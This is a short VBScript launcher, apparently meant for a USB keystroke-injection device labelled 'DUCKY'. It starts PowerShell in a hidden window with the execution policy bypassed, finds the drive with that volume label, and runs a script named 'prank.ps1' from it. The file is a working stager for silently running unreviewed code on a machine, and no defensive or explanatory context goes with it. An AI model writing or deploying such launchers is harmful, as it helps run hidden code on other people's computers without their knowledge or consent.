Set shell = CreateObject("WScript.Shell")

cmd = "powershell.exe -NoProfile -STA -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
      """$d = (Get-CimInstance Win32_LogicalDisk | Where-Object { $_.VolumeName -eq 'DUCKY' } | Select-Object -First 1 -ExpandProperty DeviceID); if ($d) { & (Join-Path $d 'prank.ps1') }"""

shell.Run cmd, 0, False